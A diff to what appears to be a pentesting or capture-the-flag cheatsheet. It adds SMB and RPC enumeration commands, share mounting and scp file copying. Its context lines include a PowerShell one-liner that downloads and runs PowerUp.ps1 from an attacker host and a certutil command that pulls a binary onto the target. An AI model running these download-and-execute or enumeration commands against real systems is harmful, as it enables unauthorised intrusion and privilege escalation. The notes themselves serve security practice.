@@ -95,3 +95,43 @@ IEX(New-Object Net.WebClient).downloadString('http://myIp:8000/PowerUp.ps1')
 
 > en la maquina escribir
 >> ```certutil.exe -f -urlcache -split http://myIpAdress/theBinary.exe thebinary.exe```
+
+## samba and rpc cheatsheets
+
+```Python
+smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
+```
+
+```Python
+sudo smbclient -L //<HOST_IP_OR_NAME> -U <USERNAME%PASSWORD>
+
+sudo smbclient -L //<HOST_IP_OR_NAME> -U <USERNAME%PASSOWRD> -g | grep Disk | cut -f 1 -d '|'
+## LIST only the names of the shared Disk
+```
+
+```Python
+rpcclient -U username ip
+```
+
+#### mount a smb folder in the host sistem
+```Python
+cd /mnt
+mkdir smbMounted
+cd smbMounted
+mount -t cifs //IPAtacking/Folder /mnt/smbMounted -o username=null,password=null,domain=WORKGROUP,rw
+```
+
+## ssh
+
+```Python
+# SEND FILES THROUGH SSH
+# ======================
+## copy file from local over to remote server
+scp -i <.ssh/key> <local/file> <user>@<host_name_or_ip>:<destination>
+## using config
+scp <local/file> <hostname>:<destination>
+## copy file from remote server to local
+scp -i <.ssh/key> <user>@<host_name_or_ip>:<file/to/copy> <local/destination>
+## using config
+scp <hostname>:<file/to/copy> <local/destination>
+```
